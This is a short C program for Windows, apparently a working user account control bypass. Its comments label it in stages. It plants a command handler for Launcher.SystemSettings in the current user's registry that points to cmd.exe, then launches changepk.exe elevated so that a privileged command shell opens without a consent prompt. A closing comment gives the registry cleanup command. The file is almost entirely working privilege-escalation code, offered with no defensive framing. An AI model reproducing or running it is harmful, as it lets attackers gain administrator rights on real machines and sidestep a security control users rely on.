#include <Windows.h>
#include <winreg.h>
#include <shellapi.h>
#include <stdio.h>
#include <wow64apiset.h>

#define _WIN32

int CreateRegistryKey(char *key, char* value)
{
    HKEY regKey;
    RegCreateKey(HKEY_CURRENT_USER, "Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command", &regKey);
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command", 0, KEY_ALL_ACCESS , &regKey);
    RegSetValueEx(regKey, key, 0, REG_SZ, (LPBYTE)value, strlen(value)+1);
    RegCloseKey(regKey);
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
    // Stage 1 (registry)
    CreateRegistryKey("DelegateExecute", "");
    CreateRegistryKey(NULL, "C:\\Windows\\System32\\cmd.exe");
    // Stage 2 (execution)
    PVOID oldValue;
    Wow64DisableWow64FsRedirection(&oldValue);
    ShellExecute(NULL, "runas", "C:\\Windows\\System32\\changepk.exe", 0, 0, SW_SHOWNORMAL);
    Wow64RevertWow64FsRedirection(oldValue);
    // Stage 3 (cleanup)
    // After you're done with the operation do "reg delete \"HKCU\\Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command\" /f";
    return 0;
} 